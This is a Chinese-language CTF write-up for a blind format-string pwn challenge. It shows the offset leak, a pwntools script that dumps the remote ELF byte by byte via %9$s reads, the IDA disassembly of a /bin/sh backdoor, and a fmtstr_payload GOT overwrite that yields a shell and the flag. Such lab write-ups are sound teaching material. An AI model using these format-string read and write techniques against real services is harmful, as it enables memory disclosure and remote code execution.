# 我附件呢？！

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/_6 $ nc nc1.ctfplus.cn 18735
Welcome to the Blind Format String Challenge!
You don't have the ELF, but you have a magic echo...
hello
hello
%s
quit
%p
0x402010
%d
4202512
AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
AAAAAAAA|0x402010|0x71|0xffffffff|0x5c|0x7ffc8a5588d8|(nil)|0x3900000000|0x4141414141414141|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0xa|(nil)
```

除掉 `AAAAAAAA` 本身，第 8 个位置参数出现了 `0x4141414141414141` ，说明 offset 为 8 。

```
|0x402010|0x71|0xffffffff|0x54|0x7fff178c4c38|(nil)|0x1900000000|0x257c70257c70257c
|%p|%p|%p|%p|%p|%p|%p|%p|%p
|0x402010|0x71|0xffffffff|0x54|0x7fff178c4c38|(nil)|0x1c00000000|0x257c70257c70257c|0x7c70257c70257c70
|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
|0x402010|0x71|0xffffffff|0x67|0x7fff178c4c38|(nil)|0x1f00000000|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025
|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
|0x402010|0x71|0xffffffff|0x7a|0x7fff178c4c38|(nil)|0x2500000000|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0xa70257c70
```

题目提示从 0x400000 开始找：

```python
from pwn import *

context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 18735)

io.recvuntil(b"You don't have the ELF, but you have a magic echo...\n")

io.sendline(b"%9$sAAAA" + p64(0x400000))

io.recv()
```

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/_6 $ python3 test.py 
[+] Opening connection to nc1.ctfplus.cn on port 18735: Done
[DEBUG] Received 0x63 bytes:
    b'Welcome to the Blind Format String Challenge!\n'
    b"You don't have the ELF, but you have a magic echo...\n"
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  00 00 40 00  00 00 00 00  │%9$s│AAAA│··@·│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0xb bytes:
    00000000  7f 45 4c 46  02 01 01 41  41 41 41                  │·ELF│···A│AAA│
    0000000b
[*] Closed connection to nc1.ctfplus.cn port 18735
```

这个头 `7f 45 4c 46`（ `·ELF` ）是 ELF ，也就是说从 0x400000 开始就可以 dump 全部的 ELF 数据。考虑到 `printf` `%s` 遇到 `\0` 会终止，每次遇到时要加上去。写成脚本，把 ELF dump 下来：

```python
from pwn import *

context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 18735)

io.recvuntil(b"You don't have the ELF, but you have a magic echo...\n")

lead_end = b"\xde\xad\xbe\xef"

addr = 0x400000

while True:
    io.sendline(b"%9$s" + lead_end + p64(addr))

    recv_all = b""
    while lead_end not in recv_all:
        recv_chunk = io.recv(timeout=1)
        if not recv_chunk:
            continue
        recv_all += recv_chunk
    # recv_valid = recv_all[:recv_all.find(lead_end)]
    idx = recv_all.find(lead_end)
    recv_valid = recv_all[:idx]
    leftover = recv_all[idx+len(lead_end):]

    tail = p64(addr).split(b'\x00')[0]
    need = len(tail) - len(leftover)
    if need > 0:
        io.recvn(need, timeout=1)

    if recv_valid is None:
        break
    
    if len(recv_valid) == 0:
        recv_valid = b'\x00'

    with open('elf', 'ab') as f:
        f.write(recv_valid)
    addr += len(recv_valid)

io.close()
```

运行的时候：

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/_6 $ python3 solve.py 
[+] Opening connection to nc1.ctfplus.cn on port 18735: Done
[DEBUG] Received 0x63 bytes:
    b'Welcome to the Blind Format String Challenge!\n'
    b"You don't have the ELF, but you have a magic echo...\n"
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  00 00 40 00  00 00 00 00  │%9$s│AAAA│··@·│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0xb bytes:
    00000000  7f 45 4c 46  02 01 01 41  41 41 41                  │·ELF│···A│AAA│
    0000000b
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  07 00 40 00  00 00 00 00  │%9$s│AAAA│··@·│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x5 bytes:
    00000000  41 41 41 41  07                                     │AAAA│·│
    00000005
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  08 00 40 00  00 00 00 00  │%9$s│AAAA│··@·│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x5 bytes:
    00000000  41 41 41 41  08                                     │AAAA│·│
    00000005
```

过一会儿：

```bash
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  22 41 40 00  00 00 00 00  │%9$s│AAAA│"A@·│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x7 bytes:
    b'AAAA"A@'
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  23 41 40 00  00 00 00 00  │%9$s│AAAA│#A@·│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x7 bytes:
    b'AAAA#A@'
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  24 41 40 00  00 00 00 00  │%9$s│AAAA│$A@·│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x7 bytes:
    b'AAAA$A@'
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  25 41 40 00  00 00 00 00  │%9$s│AAAA│%A@·│····│
    00000010  0a                                                  │·│
    00000011
Traceback (most recent call last):
  File "/home/scetayh/Projects/0xgame2026-writeups/week2/pwn/_6/solve-1.py", line 18, in <module>
    recv_chunk = io.recv()
                 ^^^^^^^^^
  File "/home/scetayh/miniforge3/envs/sage/lib/python3.12/site-packages/pwnlib/tubes/tube.py", line 146, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/scetayh/miniforge3/envs/sage/lib/python3.12/site-packages/pwnlib/tubes/tube.py", line 216, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/scetayh/miniforge3/envs/sage/lib/python3.12/site-packages/pwnlib/tubes/tube.py", line 195, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/scetayh/miniforge3/envs/sage/lib/python3.12/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to nc1.ctfplus.cn port 18735
```

完成后打开 IDA ，找到了后门：

```
LOAD:000000000040127B sub_40127B      proc near
LOAD:000000000040127B                 endbr64
LOAD:000000000040127F                 push    rbp
LOAD:0000000000401280                 mov     rbp, rsp
LOAD:0000000000401283                 lea     rax, aBinSh     ; "/bin/sh"
LOAD:000000000040128A                 mov     rdi, rax
LOAD:000000000040128D                 call    sub_4010E0
LOAD:0000000000401292                 nop
LOAD:0000000000401293                 pop     rbp
LOAD:0000000000401294                 retn
LOAD:0000000000401294 sub_40127B      endp
```

用 format string 漏洞：

```python
Python 3.12.14 (main, Sep  2 2026, 23:29:55) [GCC 15.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
Ctrl click to launch VS Code Native REPL (https://aka.ms/python-native-repl)
>>> from pwn import *
>>> io = remote("nc1.ctfplus.cn", 18735)
[x] Opening connection to nc1.ctfplus.cn on port 18735
[x] Opening connection to nc1.ctfplus.cn on port 18735: Trying 43.248.116.26
[+] Opening connection to nc1.ctfplus.cn on port 18735: Done
>>> context.arch = "amd64"
>>> io.sendline(fmtstr_payload(8, {0x404038:0x40127B}))
>>> io.interactive()
[*] Switching to interactive mode
Welcome to the Blind Format String Challenge!
You don't have the ELF, but you have a magic echo...
                                                                                                                                                                                                                                                                                q                                             �aaaab8@@ls
/bin/sh: 1: s: not found
ls
flag
pwn
cat flag
0xGame{ffea72f7-ac92-4150-b7f2-3e1d7d662cbd}
```

得到 flag 为 `0xGame{ffea72f7-ac92-4150-b7f2-3e1d7d662cbd}` 。